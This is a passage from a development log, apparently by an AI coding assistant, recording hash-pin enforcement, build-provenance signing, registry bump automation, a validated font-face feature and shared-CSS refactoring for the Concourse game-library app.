  tagged-release assumption anyway, so the automation built earlier this session doesn't
  (and isn't meant to) extend to this kind
- **Real gap caught on the Concourse side before considering this done**: `install_plugin`
  already accepted `expected_sha256` as a parameter, but only ever threaded it into
  `install_wasm_plugin` - `install_data_theme` had no hash-pin enforcement at all, meaning a
  theme registry entry's pinned hash would've been cosmetically present in `registry.json` but
  never actually checked at install time. Fixed by threading `expected_sha256` into
  `install_data_theme` too, hard-rejecting on mismatch against the manifest's own bytes -
  identical shape to `install_wasm_plugin`'s existing check. Added a real end-to-end test
  (`rejects_a_theme_whose_bytes_dont_match_the_pinned_hash`) against a real HTTP server, not a
  unit test of the hash comparison in isolation - confirms the install aborts and nothing gets
  written to disk. Full `cargo test` suite (5/5) and `bun run build` both pass clean

**Converted Brick Block into the new third-party system for real - caught a genuine bug the
unit tests never would have.** Before writing the manifest content, tried to reason about
whether `CardVisualRenderer`'s output would actually be styled correctly, rather than assuming
"the interpreter works, so this'll just work." It wouldn't have: `.cover`/`.cover-placeholder`
lived in `GameCard.vue`'s `<style scoped>` block, and Vue's scoped CSS works by compiling a
`data-v-<hash>` attribute onto every element *that specific component's own template* renders -
`CardVisualRenderer` is a separate component, so its `h()`-created elements would never carry
GameCard's scope attribute, and the scoped rule would have silently never matched them. Same
underlying category as why `.balloon` was already unscoped (Teleport breaks the parent-child
DOM relationship scoped CSS depends on) - a different mechanism breaking the same assumption.
Fixed by moving `.cover`/`.cover-placeholder` into the existing unscoped `<style>` block, and
verified the fix for real: checked the compiled CSS output and confirmed the selector has no
`[data-v-*]` qualifier anymore, rather than trusting the theoretical explanation alone.
- This is exactly the kind of gap the earlier interpreter unit tests couldn't have caught -
  they verified the AST validates and produces the right VNode *structure*, never that the
  result would actually be *styled* correctly once rendered through a real theme. Doing the
  real end-to-end conversion, not just trusting the component-level tests, is what surfaced it
- `brick-block-data-theme` (in `data-theme-plugins`) gained a `cardVisual` field reproducing
  the one real content difference this theme has from the default card - `★` instead of the
  dynamic first-letter placeholder - verified against Concourse's actual
  `validateCardVisualAst`/`renderCardVisualAst` (not just the repo's own schema validator,
  which doesn't understand AST content at all) before committing. Bumped to `1.1.0` (new
  capability, backward compatible)
- Re-pinned the registry entry to the new commit + freshly-computed hash - a genuine
  re-review-and-re-pin, not just a mechanical bump, since the content actually changed
- What's still out of scope, unchanged from the earlier "still just GameCard" decision:
  BigPictureTile has no equivalent AST region wired up at all, so its `.brick-frame` wrapper
  gap stays unaddressed - this conversion only closes GameCard's gap, matching what was
  actually built
- Full visual confirmation in the actual running Tauri app wasn't done this session - only
  automated/structural verification (compiled CSS, real validator/interpreter calls). Worth
  running the real app to eyeball it before calling this fully done

**Closed a real gap in theme parity: signing (Milestone 14) and the registry pin (Milestone 17
follow-up) are separate, complementary mechanisms, and only one of them actually existed for
themes.** User asked directly why a theme registry entry needs `wasmSha256` at all, given
`data-theme-plugins` was never wired with the same `actions/attest-build-provenance` step the
other 7 plugin repos got - re-checked that repo's `release-themes.yml` to confirm the absence
was real, not assumed. Consequence: `verify_plugin_provenance` would call out to GitHub's
attestations API on every theme install and always come back "not verified," not because
anything was broken but because that CI step had simply never been added there. For themes,
the registry pin wasn't a redundant second layer the way it is for WASM plugins - it was the
*only* integrity check that existed at all.
- Added the same `id-token: write`/`attestations: write` permissions and
  `actions/attest-build-provenance@v2` step to `data-theme-plugins`' `release-themes.yml`,
  `subject-path: "dist/*.json"` (a glob) producing one attestation per theme in a single step
  rather than a step per theme - a data-only theme has no binary, so the manifest itself (now
  the release asset, already renamed to `<id>.json`) is what gets attested
- Verified the signing actually took effect for real, not just "the workflow ran green": the
  push that added the CI step didn't itself trigger a run (path filter only watches
  `themes/**`, same gotcha hit earlier with the plugin repos' notify-registry step), so used
  `gh workflow run --repo ... workflow_dispatch` to force a real run instead of introducing a
  spurious `themes/**` commit just to trigger one. Then ran `gh attestation verify` against the
  actual published `brick-block-data-theme.json` - exit code 0, no visible summary text
  (a rendering quirk in this shell, not a real problem) - confirmed by also running the same
  command against the *wrong* repo and getting a real, visible `HTTP 404` and exit code 1,
  proving the tool genuinely round-trips to GitHub's attestations API rather than trivially
  passing
- Added `midnight-neon-theme` and `sakura-theme` to `concourse-plugin-registry` too, completing
  registry coverage for all three themes in the repo (previously only Brick Block had an
  entry). Both reviewed (plain `cssVariables`, nothing exotic) and pinned the same
  commit-SHA'd-raw-URL way as Brick Block's entry, for the same reason (the shared-tag release
  model doesn't fit a tagged-release convention). All three themes now have both signing
  (repo-wide CI, just added) and a reviewed registry pin (per-theme, just added) - full parity
  with how the 8 WASM/metadata/wrapper plugin repos are already covered

**Extended the registry's version-bump automation (built earlier this session for the 8
WASM/metadata/wrapper repos) to cover themes too - a real redesign, not a copy-paste.** The
existing dispatch/bump mechanism assumed one repo maps to exactly one registry entry (true for
all 8 of those repos) - `data-theme-plugins` breaks that assumption outright, hosting three
themes (three separate registry entries) in one repo. Matching a dispatch by `repo` alone, the
way `bump-entry.sh` did, would have updated all three entries at once regardless of which
theme actually changed.
- `bump-entry.sh` rewritten to match by `id` instead of `repo` - `id` is already guaranteed
  unique per registry entry (unlike `repo`, now shared three ways), so it's the correct primary
  key regardless of how many entries a given repo ends up hosting. `repo` is read back off the
  matched entry itself rather than passed in separately. Also branches on the matched entry's
  own `kind` (reusing the same theme-vs-everything-else logic `validate.sh` already had) to
  build either a tagged-release URL+hash or a commit-pinned raw URL+hash
- Payload shape changed from `{repo, tag}` to `{id, ref}` uniformly - `ref` is a version tag for
  source/wrapper/metadata entries, a commit SHA for theme entries. Propagated to all 8 existing
  plugin repos' `publish.yml` (each now reads its own `id` from `plugin.json` at dispatch time
  via `jq`, rather than relying on `github.repository`)
- Hit a real, reproducible bug while propagating the payload change across those 8 repos: a
  plain Python string-replace script skipped `rawg-metadata-wasm-plugin` silently. Root cause -
  that file had CRLF line endings (from an earlier `Edit`-tool touch this session), the other 7
  had plain LF (appended via a raw Bash heredoc originally), so an exact-substring match against
  an LF-only pattern never matched. Caught by actually diffing the file against the expected
  block rather than assuming the skip meant "already patched," fixed by normalizing line
  endings before matching and re-applying the target's original style on write
- `data-theme-plugins`' `release-themes.yml` gained: `fetch-depth: 0` on checkout (needed to
  diff `github.event.before` against `github.sha`), a step computing which theme(s) actually
  changed in *this specific push* (this workflow re-validates/republishes every theme on every
  push regardless of which one changed, so dispatching unconditionally would open a no-op PR
  for every untouched theme alongside the one real change - only meaningful for `push` events,
  skipped on manual `workflow_dispatch` since there's no `before` commit to diff against), and a
  dispatch step per changed theme carrying `github.sha` as `ref`
- Manual step still outstanding, not something this session can do: `REGISTRY_DISPATCH_TOKEN`
  secret needs setting on `data-theme-plugins` (same PAT pattern as the 8 plugin repos) -
  can't be done here since the token value was never retained after the user set it earlier,
  by design (shouldn't sit in chat history). Asked the user to run `gh secret set
  REGISTRY_DISPATCH_TOKEN --repo smh0505/data-theme-plugins` themselves
- README updated to correct its own now-stale claim ("theme entries are added/re-pinned by
  hand, not through the release-dispatch automation") now that this is wired up
- Not yet verified end-to-end against a real push (blocked on the secret above) - the
  push-vs-workflow_dispatch distinction and the CRLF bug were both caught through direct
  inspection/testing of the scripts and files themselves, not a live dispatch test yet

**Verified end-to-end for real, once the secret was set.** Bumped `sakura-theme` to `1.0.2`
(patch, no functional change - solely to exercise the chain) and pushed a real commit rather
than using `workflow_dispatch`, since the dispatch step is deliberately guarded to `push` only.
Full chain confirmed:
- `release-themes.yml` validated, published (signed), correctly diffed `github.event.before`
  against `github.sha` and dispatched *only* for `sakura-theme` - `midnight-neon-theme` and
  `brick-block-data-theme`, unrelated to this push, were untouched, confirming the diff logic
  actually discriminates rather than dispatching for every theme in the repo every time
- Registry's `bump-entry.sh` matched the dispatch by `id` correctly (not `repo`, which all three
  theme entries share) and opened a PR (`bump/sakura-theme-<short-sha>`) whose diff touched
  *only* `sakura-theme`'s `manifestUrl`/`wasmSha256`, pointing at the exact new commit SHA
- Hit the same one-time bot-PR `action_required` gate seen earlier this session for the very
  first bot-authored PR against this repo - approved via the same `gh api ... /approve` call,
  merged, and the post-merge `validate.yml` run on `main` passed clean
- Full chain - push, diff, dispatch, PR, validate, merge, re-validate - works exactly as
  designed, for a real theme, not a synthetic test

**Post-ship fidelity pass on Brick Block (Data)** - the user actually ran the app and compared
the converted theme against the original, surfacing several real gaps the acceptance test
(which only checked structure/safety, never visual output) never would have.
- **Border shape was round, not sharp.** `.card-visual` had no variable hooks at all -
  `border-radius: var(--radius-md)` and a hardcoded `1px` border, neither overridable. Added
  `--card-radius`/`--card-border-width`, same opt-in pattern as the earlier balloon/button
  hooks, defaulting to prior behavior exactly. `brick-block-data-theme` set `3px`/`0` to match
  the original built-in's values
- **Diagonal stripes + yellow glyph missing.** `.cover-placeholder` had `background`/`color`
  hardcoded to plain `--color-surface0`/`--color-text`, no `text-shadow` or font-size hook at
  all. Added `--cover-placeholder-background` (a CSS custom property can hold a full
  `repeating-linear-gradient(...)` value just as well as a flat color, so no new node type or
  AST change was needed), `-color`, `-text-shadow`, `-font-size`. `brick-block-data-theme` set
  these to the original's exact stripe gradient, `#fce303` yellow, and drop shadow
- **Balloon background/font copy request surfaced a real, separate bug.** Before even getting
  to styling: `DataThemeManifest` (the Rust struct `list_data_themes` parses this file through)
  had never declared a `cardVisual` field at all - it was silently dropped on every
  install/list, regardless of what the manifest actually contained on disk. Caught by directly
  inspecting the *cached* `theme.json` in app-data and finding `cardVisual` simply wasn't there,
  not by assumption. Fixed by adding `card_visual: Option<serde_json::Value>` to the Rust
  struct, and separately confirmed `PluginManifest`/`createDataThemePlugin` on the frontend
  already threaded it through correctly via a plain object spread once Rust actually included
  it - no additional TS-side bug, just the one Rust-side gap
  - Copied the updated manifest directly into `%APPDATA%\com.bloppy.concourse\data-themes\
    brick-block-data-theme\theme.json` to test each fix live without a full publish/registry
    cycle each time - the manifest is what Concourse caches locally, the font file itself never
    gets copied to app-data at all (see below)
- **Balloon background** - `.balloon`'s `background` was hardcoded to `--color-crust`, no hook.
  Added `--balloon-background`. Also fixed the arrow tip
  (`.balloon-above/-below::after`'s `border-*-color`) to track that *same* new variable instead
  of staying separately hardcoded to `--color-crust` - the original built-in `slots` version
  had to manually duplicate its override across both the balloon body and the arrow tip
  (`.brick-balloon` and `.brick-balloon.balloon-above/-below::after`), which meant they *could*
  drift out of sync if someone touched one and not the other; tying both to one variable here
  closes that off structurally rather than just avoiding it by convention
- **Balloon font never actually loaded - and couldn't, structurally, no matter how the
  `cssVariables` value was written.** `--balloon-font-family` only ever lets a theme *select* a
  font by name; it can no more *load* a font file than any other CSS property value can. Real
  loading needs an actual `@font-face` rule with `src: url(...)`, and the data-only tier only
  ever sets flat custom-property values, never raw CSS rules - confirmed this structurally
  before proposing anything, not assumed
  - **New capability: `fontFaces`** (`ThemePlugin.fontFaces`/`PluginManifest.fontFaces`,
    threaded through `createDataThemePlugin` and `DataThemeManifest.font_faces` the same way as
    `cardVisual`). New `src/theme/fontFaceRegistry.ts`: `setActiveFontFaces`/
    `clearActiveFontFaces`, wired into `theme.ts`'s activate/deactivate lifecycle
  - This is declarative data (no code), but still untrusted third-party content going straight
    into a real `<style>` block's text - a family name or url containing `"`/`;`/`{`/`}` could
    otherwise break out of the `@font-face` rule and inject arbitrary CSS elsewhere on the
    page. Every field validated against a strict allowlist before any CSS text is constructed:
    `family`/`weight` against `^[A-Za-z0-9 -]{1,N}$`, `style` against a fixed enum, `url` parsed
    via `new URL()` and required to be `https:`, plus a belt-and-suspenders reject on any
    embedded `"`/`'`/`;`/`{`/`}` even though a well-formed https URL can't contain those per
    spec - untrusted input doesn't get to rely on "shouldn't happen"
  - Verified the validator for real against actual attack strings (CSS-injection via quote+brace
    in the family name, embedded quotes in the url, non-`https:` and `file:` schemes, malformed
    weight/style values) before trusting it, same discipline as the earlier compiler-dom escape
    tests - all correctly rejected, valid entries correctly accepted
  - CSP needed a real change: `font-src` wasn't set at all (falls back to `default-src 'self'`,
    which would've blocked any external font regardless of the validator passing it). Added
    `font-src 'self' https:`, mirroring the precedent `img-src 'self' data: https:` already set
  - Discussed where the referenced font file should actually live before building anything -
    a third-party CDN is meaningfully more vulnerable than self-hosting (unpinnable/mutable
    content, no review trail, the exact thing the built-in theme already moved away from once
    per its own history) versus a commit-pinned `raw.githubusercontent.com` URL into
    `data-theme-plugins` itself (same immutability guarantee already trusted everywhere else
    this session - `cardVisual`, every `wasmSha256` pin). Settled on the latter; `validate.mjs`
    now enforces this as a real check (`fontFaces[].url` must start with
    `https://raw.githubusercontent.com/smh0505/data-theme-plugins/`), not just a convention
  - Clarified for the record: the font *file* lives only in the GitHub repo, never copied to
    local app-data - the WebView itself fetches it live via `@font-face`'s `url(...)` at
    CSS-parse time, the same way any browser loads any remote web font. Concourse's own code
    never touches the font's bytes at all, unlike the manifest JSON which Concourse does
    download and cache locally
- **Re-verified Fusion Pixel Font's actual license against the live upstream repo** before
  redistributing the same file a second time (in `data-theme-plugins`, alongside the copy
  already bundled in Concourse itself), rather than trusting the locally-cached
  `FUSION-PIXEL-OFL.txt` blindly. `gh api` against `TakWolf/fusion-pixel-font` directly:
  - GitHub's repo-level API reports the license as "MIT" - checked further rather than taking
    that at face value, and found the repo actually splits licensing in two: `LICENSE-OFL`
    (the actual font files) and `LICENSE-MIT` (build tooling/scripts only), per the README's own
    explicit "字体"/"构建程序" (Font/Build-tooling) section. GitHub's single `.license` field
    just can't represent a two-license repo and picked one arbitrarily - not authoritative
  - `diff`'d the live `LICENSE-OFL` against the locally-bundled `FUSION-PIXEL-OFL.txt` - byte-
    identical, confirmed nothing drifted
  - Checked the upstream component table too (every source font merged into Fusion Pixel - Ark
    Pixel, Misaki, MisekiBitmap, BoutiqueBitmap7x7/9x9, Cubic-11, Galmuri) - all OFL-1.1 or an
    OFL-compatible unlicensed font, no GPL/proprietary component hiding underneath
  - Conclusion: redistributing the unmodified `.woff2` alongside its OFL license text (already
    the existing pattern) is fully compliant - no conflict between that repo's license and
    `data-theme-plugins`' own, since OFL only binds the font itself, not software bundling it
  - Added `FONTS.md` at the repo root (credits, extensible to future themes) and a `fonts`
    field on the manifest - deliberately separate from the functional `fontFaces` above (pure
    attribution metadata, `{name, author, url, license}`, never consumed by Concourse at all,
    not threaded through any Rust/TS type). `validate.mjs` gained a light shape check for both
    new fields - verified it actually fires (not vacuously passing) against a deliberately bad
    CDN URL and an incomplete `fonts` entry, since nothing in the existing manifests exercised
    either branch before that test
  - `README.md` also gained documentation for `cardVisual`/`fontFaces`/`fonts`, none of which
    had been documented there since they were first added earlier this session - a real gap,
    not just this pass's own additions
- All of the above committed and pushed once the user lifted the earlier "hold" instruction.
  Confirmed the font URL actually resolves (`curl`, matched the real 668640-byte file) before
  wiring `fontFaces` to it - a separate follow-up commit, since the URL needed that commit's
  own SHA first. `validate.mjs`'s new `fontFaces`/`fonts` checks ran for real in CI this time,
  not just locally. Both pushes to `data-theme-plugins` correctly dispatched their own registry
  PR each (the diff-based dispatch logic distinguishing them correctly); the first (pointing at
  the pre-`fontFaces` commit) was closed as stale once the second, complete one opened - same
  "two open bump PRs for one id, close the older" guidance from earlier in this session, now
  actually exercised for real rather than just documented as a rule

## Milestone 18 — Shared Styles Convention (scoped, not started)
User proposed a style-convention change directly: less `<style scoped>` per component, more
shared CSS (colors, borders, radii, other repeated patterns) collected into a `styles.css`.
Asked whether this was "huge enough" to warrant its own milestone rather than just doing it -
judged yes, for two concrete reasons rather than a reflexive "big changes get milestones" rule:
- Real scope. This session's Brick Block work touched `GameCard.vue`'s scoped styles five
  separate times (`.card-visual`, `.cover-placeholder`, `.balloon` and its arrow tip), each time
  because a value was hardcoded in one component's own scoped block with no way for a theme (or
  any other consumer) to reach it. That's a real, repeated pattern across a real component, not
  a one-off - auditing every other component (`BigPictureTile.vue`, the modal forms, etc.) for
  the same shape is genuine, non-trivial work
- A real, already-proven failure mode to design around, not a hypothetical. `.cover`/
  `.cover-placeholder` had to move out of `<style scoped>` entirely earlier this session because
  `CardVisualRenderer` (a separate component) needed to render them and Vue's scoped-CSS
  mechanism (a compiled `data-v-<hash>` attribute, unique per component) meant a scoped rule
  there would have silently never matched. Any "collect shared styles centrally" effort needs
  to reckon with this same boundary deliberately, not rediscover it component-by-component the
  way this session did
- Scoped rather than started: three checklist items logged (audit real duplication before
  moving anything, decide `styles.css`'s relationship to `App.vue`'s existing `:root` token
  block, migrate with the same compiled-output verification discipline used for every CSS fix
  this session, not a visual-assumption pass) - deliberately not designed further than that
  without actually doing the audit first

**Audit done (delegated to Explore, 22 components read).** Real findings, organized the same
way the milestone scoped it:
- **Exact duplicate blocks worth centralizing**: the skeleton shimmer animation + `@keyframes`
  (`SkeletonCard.vue`/`SkeletonRow.vue`, byte-identical); list-row shell + thumbnail dimensions
  (`GameListRow.vue`/`SkeletonRow.vue`); tag pill styling (`GameFilters.vue`/`EditGame.vue`);
  empty-state layout (`GameGrid.vue`/`GameList.vue`); and the biggest cluster - most of Big
  Picture's dark-backdrop scheme (colors, z-index layering, fade transitions, placeholder
  color, several `var(..., literal-fallback)` pairs) duplicated near-identically across
  `BigPictureGrid.vue`/`BigPictureSlideshow.vue`/`BigPictureTile.vue`. Also flagged: two of
  those duplicated fallback literals (`var(--shadow-lg, 0 12px 32px rgba(0,0,0,0.5))` and
  `var(--radius-lg, 12px)`) don't even match the real tokens' actual values (`0.18` alpha,
  `10px`) - if the variable were ever genuinely undefined, the fallback would render visibly
  different from the token's real default, a latent inconsistency independent of the
  duplication itself
- **Existing tokens not used**: hardcoded `1px` borders (10+ files) where
  `--button-border-width` already exists for exactly this; hardcoded `0.5rem`/`0.75rem` gaps
  (10+ files) matching `--space-2`/`--space-3` exactly; `border-radius: 4px`
  (`NavSidebar.vue`, the list-row thumbnail) matching `--radius-sm`; `padding: 1.5rem`
  (`BaseModal.vue`) matching `--space-5`; `color: white` (`TitleBar.vue`) where the established
  convention elsewhere is `--color-on-accent`
- **Two off-token values needing a real decision, not a mechanical move**: `border-radius: 8px`
  (list-row shell) and `3px` (tag pills) don't match any of `--radius-sm/md/lg` (4/6/10px) -
  standardize onto an existing token, or these are genuinely a fourth radius value the scale
  doesn't have yet. Left open rather than picked arbitrarily
- **Category 3 (the scoped-CSS/foreign-component risk this milestone exists partly to design
  around)**: no second live instance of the exact `GameCard.vue`/`CardVisualRenderer` bug found.
  One correct usage of the same underlying pattern found instead - `PluginSettings.vue` reaches
  into `InstallableStatus.vue`'s root class via Vue's `:deep()` combinator, which is
  specifically designed to pierce the scoped-CSS boundary deliberately, unlike the `.cover`/
  `.cover-placeholder` bug which just happened to work by accident until it didn't. Worth
  documenting `:deep()` as the sanctioned escape hatch once `styles.css`'s conventions get
  written up. One forward-looking risk noted, not urgent: `BigPictureTile.vue` is currently
  swapped wholesale via `useThemeSlot` (a full component swap, safe), but if a "tile visual
  AST" mechanism is ever added mirroring Milestone 17's card visual, `.tile-cover`/
  `.tile-cover-placeholder` would need the same unscoped treatment pre-emptively, not
  discovered the hard way again
- Also flagged (not one of the three assigned categories, but real): `.settings-form` is a de
  facto contract class name - any plugin kind's `settingsComponent` is expected to emit it
  (`PluginSettings.vue` reads it via `:deep()` for every plugin kind) - a shared-contract class
  that should probably be documented alongside whatever `styles.css` convention gets written,
  since it's exactly the kind of implicit cross-component convention this milestone is trying
  to make explicit

**`:root` moved into `src/styles.css` - decided immediately after the audit, not left open.**
User's call: absorb entirely, not split token-vs-pattern across two files. Moved the whole
`:root {}` rule verbatim (including the `font-family`/`color`/`background-color` lines that
live inside the same rule, not just the custom properties) into a new `src/styles.css`,
imported once via `main.ts` (`import "./styles.css"`) rather than through `App.vue`, so the
global stylesheet isn't tied to that component's own file. `App.vue` now has a one-line comment
pointing at the new location instead of the block itself.
- Verified for real rather than assumed: rebuilt, then `grep`'d the actual compiled CSS output
  for the `:root` rule and confirmed every single token survived with byte-identical values
  (colors, spacing, radii, shadows, `--button-border-width`) - not just "the build didn't
  error," an actual diff-equivalent check against the pre-move values
- `cargo check` unaffected (no Rust touched) - checked anyway rather than assumed safe
- Migrating the actual Category 1 duplicate patterns into `styles.css`, and resolving the two
  off-token radius values, remain open - this pass was the audit + the one concrete decision
  (`:root`'s new home), not the full migration

**Resolved the two off-token radius values.** `3px` (tag pills, `GameFilters.vue`/`EditGame.vue`)
snapped onto `--radius-sm` (4px) directly - a 1px nudge, no real decision needed. `8px` (list-row
shell) was genuinely ambiguous - exactly equidistant between `--radius-md` (6px) and
`--radius-lg` (10px), no code-derivable answer - so asked rather than picking arbitrarily.
User chose a new dedicated token over snapping onto either existing step or renaming/expanding
the sm/md/lg scale itself (which would've meant repointing `--radius-lg`'s existing consumers,
well beyond what these two components needed).
- Added `--radius-row: 8px` to `styles.css` initially, wired `GameListRow.vue`/`SkeletonRow.vue`
- **Caught a third, previously-unaudited occurrence of the same `8px` value while migrating**:
  `BaseModal.vue`'s `.modal-frame` - the earlier Explore-delegated audit's Category 1 finding
  only named the two list-row files, missing this one. Found by grepping the compiled CSS
  output for any remaining literal `8px`/`3px` radius after the "fix," rather than trusting the
  audit's file list as complete - a real gap in the earlier audit, not just extra diligence
  that happened to turn up nothing
  - This meant `--radius-row` was the wrong name after all - a modal frame isn't a "row."
    Renamed to `--radius-panel` (covers both a list-row shell and a modal frame as generic
    container semantics) before it could spread under a name that didn't fit, updated both
    already-migrated consumers plus the new `BaseModal.vue` site
- Verified via compiled CSS, not assumed: `--radius-panel: 8px` present in the token block,
  zero remaining literal `border-radius:8px`/`3px` anywhere in `src/` (a fresh `grep -rn`
  across the whole source tree, not limited to the audit's original file list, to make sure
  nothing else was missed a second time)

**`--radius-panel` folded into the named scale, on further user direction.** Rather than keep
`8px` as a one-off outside the `sm`/`md`/`lg` naming pattern, shifted the whole scale: old
`--radius-lg` (10px) became `--radius-xl`, `--radius-panel` (8px) took over the `--radius-lg`
name - `sm`/`md`/`lg` (4/6/10) becomes `sm`/`md`/`lg`/`xl` (4/6/8/10). This is exactly the
higher-blast-radius option flagged (and set aside) during the original 8px decision - "would
mean renaming --radius-lg and repointing its existing consumers, well beyond what these
components actually need" - now deliberately chosen instead once the token had a real second
use (`BaseModal.vue`) beyond the original two files.
- `grep`'d every real consumer before touching anything, not just the ones already in this
  session's working set: `BigPictureTile.vue`/`BigPictureSlideshow.vue` both had a live
  `var(--radius-lg, 12px)` needing the rename too
- **Fixed a real pre-existing bug while touching those two lines, not just renaming past it**:
  the fallback literal `12px` never matched `--radius-lg`'s actual value (10px) - flagged in
  the original Explore audit as a latent inconsistency ("if the variable were ever genuinely
  undefined, the fallback would render visibly different from the token's real default") but
  not fixed at the time since it wasn't in scope then. Now `var(--radius-xl, 10px)`, correctly
  in sync
- Verified via compiled CSS: all four scale values (`sm`/`md`/`lg`/`xl` = 4/6/8/10px) present
  with correct values, zero stray `--radius-panel` or `12px` fallback left in either source or
  build output
- Left the historical devlog/milestones entries documenting `--radius-panel`'s original
  creation as-is rather than rewritten - they're a record of what was true at the time, not a
  live description of the current state; this entry is the update, not an edit to those

**Moved App.vue's remaining unscoped `<style>` block into `styles.css` too.** Clean split once
looked at directly: App.vue's `<style scoped>` block (`.app-window`, `.app-shell`, `.content`,
`.big-picture-controls`, `.view-toggle-button`) is genuinely App.vue's own template - stayed.
Its separate unscoped `<style>` block (`*`/`*::before`/`*::after` box-sizing, `html`/`body`/
`#app` reset, the `button`/`input`/`textarea`/`select` baseline and focus/disabled states, the
themed-scrollbar rules) is universal primitive-element styling with nothing App.vue-specific
about it at all - moved wholesale, same reasoning as the `:root` move earlier.
- Verified via compiled output, not assumed identical just because it's "just a move": checked
  for accidental duplication (`grep -c` on the `button{...}` base rule, the scrollbar rule, and
  `:root` - each appears exactly once, not twice), and confirmed the `.app-window` scoped rule
  still carries its `data-v-*` attribute correctly (proof the remaining scoped block still
  compiles as scoped, not accidentally flattened by the edit)
- Noted, not fixed (out of scope for a pure relocation): the global input/textarea/select rule
  still hardcodes `1px` instead of `var(--button-border-width)` - one of the pervasive
  `1px`-instead-of-token sites the original audit already flagged. Left for the actual
  Category-1-pattern migration pass, not bundled into this move
- `App.vue` now has zero non-scoped CSS of its own - every primitive/global rule lives in
  `styles.css`, every remaining rule in `App.vue` is genuinely scoped to its own template

**Migrated 4 of the audit's Category 1 duplicate blocks into shared `styles.css` classes.**
Pattern for each: identify the genuinely-shared subset of properties, add it as a shared class,
keep only each component's real extra properties in its own `<style scoped>` block, and layer
both classes on the same template element (`class="local-name shared-name"`) rather than
picking one or the other - preserves each component's own semantic class name (useful in
devtools/for future component-specific overrides) while eliminating the actual duplication.
- `.shimmer` + `@keyframes shimmer` - `SkeletonCard.vue`/`SkeletonRow.vue`'s shimmer divs now
  reference the shared class directly (`class="shimmer"`, replacing `skeleton-shimmer`); both
  local `@keyframes shimmer` blocks and the duplicated gradient rule deleted entirely - neither
  component had anything extra layered on top, so nothing stayed local for this one
- `.list-row-shell` (shell layout/border/padding) and `.list-row-thumb` (dimensions/radius) -
  `GameListRow.vue`'s `.row`/`.thumb`/`.thumb-placeholder` and `SkeletonRow.vue`'s
  `.skeleton-row`/`.skeleton-thumb` templates gained the shared classes alongside their own
  names; `GameListRow.vue`'s `.thumb` keeps only `object-fit: cover` locally (the original
  combined `.thumb, .thumb-placeholder` selector applied `object-fit` to the placeholder `<div>`
  too, which is a no-op there per spec - object-fit only affects replaced elements - so scoping
  it to just `.thumb` changes nothing observable, just removes a meaningless line from the
  placeholder's rule)
- `.tag-pill` - `GameFilters.vue`'s `.tag` rule had nothing extra beyond the shared subset,
  deleted entirely once `tag-pill` was added to its template class list. `EditGame.vue`'s
  `.tag` kept its real extra properties (the remove-button's `inline-flex`/`gap` layout)
- `.empty-state` - `GameList.vue`'s `.empty` was byte-for-byte the shared subset, deleted
  entirely; `GameGrid.vue`'s kept just its one real extra property, `grid-column: 1 / -1`
- **Verified via compiled CSS, not assumed correct just because the source diff looked clean**:
  confirmed each of the 4 shared classes compiles exactly once with the expected properties;
  confirmed `.row`/`.skeleton-row` (fully-emptied local rules) emit *zero* CSS output now, not
  an empty-but-present rule; confirmed `.tag[data-v-*]` (EditGame's) only carries the 3 leftover
  properties, not the full original set; confirmed the 4 distinct `.empty[data-v-*]` rules
  still in the bundle are legitimately separate, untouched components
  (`BigPictureGrid.vue`/`BigPictureSlideshow.vue`/`PluginSettings.vue`, plus `GameGrid.vue`'s
  intentional one-property leftover) - not a sign anything was missed
- CSS bundle shrank 22.65kB → 21.85kB, consistent with real duplication actually removed, not
  just reorganized
- Left explicitly out of scope: Big Picture's own, much larger backdrop-styling duplication
  cluster (a separate audit finding, its own migration effort), and the remaining Category 2
  unused-token findings (`--space-2`/`--space-3` gaps, `--space-5` padding, `--color-on-accent`)

**Migrated Big Picture's backdrop cluster - the audit's biggest single finding, spanning
`BigPictureGrid.vue`/`BigPictureSlideshow.vue`/`BigPictureTile.vue`.** Read all three files
fully before designing anything, rather than working from the audit summary alone - found the
actual duplication was more granular than "the backdrop scheme," really seven separate
sub-patterns of varying overlap:
- `.bp-surface` - the root full-screen dark base (`position:fixed;inset:0;background:#111;
  color:#fff;z-index:20;outline:none`), identical between `.big-picture`/`.slideshow`; each
  keeps its own scroll/overflow handling locally
- `.bp-backdrop` - the background-art image positioning, 100% identical, no local remainder
  needed in either file
- `backdrop-fade-*` transition classes - genuinely forced identical by both files' own
  `<Transition name="backdrop-fade">`, not just similar - moved to `styles.css` unscoped with
  the exact same class names Vue already requires
- `.bp-backdrop-overlay-base` - position/inset/z-index only; deliberately did *not* fold in
  the actual gradient `background` value, since the two files' alpha stops are a real design
  difference (the grid needs tiles to stay more visible than the slideshow's hero cover flow
  needs) - kept local per component rather than forcing a false unification
- `.bp-cover-frame` - the button/tile visual base (background/border/radius/padding/cursor)
  shared between `BigPictureTile.vue`'s `.tile` and `BigPictureSlideshow.vue`'s `.strip-cover`
  - two different UI elements (grid tile vs. slideshow strip cover), not the same component,
  but the same visual shape
- `.bp-cover-focused` - the identical focused/centered border-color+box-shadow, applied via a
  template class binding alongside `.bp-cover-frame` rather than a compound selector, so each
  component can still layer its own extra behavior on the *same* shared class name locally
  (`.tile.bp-cover-focused{transform:scale(1.05)}` - the strip-cover's centered state has no
  such extra, needed nothing added)
- `.bp-cover-placeholder` - the placeholder look (`background:#444;display:flex;align-items:
  center;justify-content:center`), dimensions/font-size kept local since they genuinely differ
  per context (grid tile vs. slideshow strip)
- `.bp-empty-state` - deliberately a *different* shared class from the desktop `.empty-state`
  added earlier, not a reuse - different values (font-size 1.5rem, no padding), genuinely a
  different context, would have been a false unification to force onto the same class
- **Found and fixed three more mismatched fallback literals** while touching these exact
  lines, same category as the `--radius-xl` one fixed earlier this session:
  `var(--color-accent, #fff)` (real value `#1e66f5`, a blue, nothing like white),
  `var(--shadow-lg, 0 12px 32px rgba(0, 0, 0, 0.5))` (real alpha `0.18`, not `0.5`), and
  `var(--radius-md, 10px)` (real value `6px`, not `10px`) - none had been individually flagged
  by name in the original audit, only discovered by actually looking at each line being
  migrated rather than trusting the audit summary as the complete list of what needed fixing.
  Dropped all three fallbacks entirely rather than correcting them to matching literals - these
  are base tokens always defined in `:root` (unlike `--balloon-*`/`--font-pixel`'s genuinely
  opt-in pattern), so a defensive fallback was never structurally necessary for them at all
- Verified via compiled CSS with the same rigor as every prior migration this session: each of
  the 7 shared classes present exactly once with the right properties; the `backdrop-fade-*`
  transition present exactly once (not duplicated); every component's leftover scoped rule
  contains only its genuinely-extra properties (`grep`'d each one individually -
  `.big-picture`, `.slideshow`, `.tile`, `.strip-cover`, `.tile.bp-cover-focused`,
  `.tile-cover-placeholder`, `.strip-cover-placeholder`, both `.empty` leftovers); confirmed
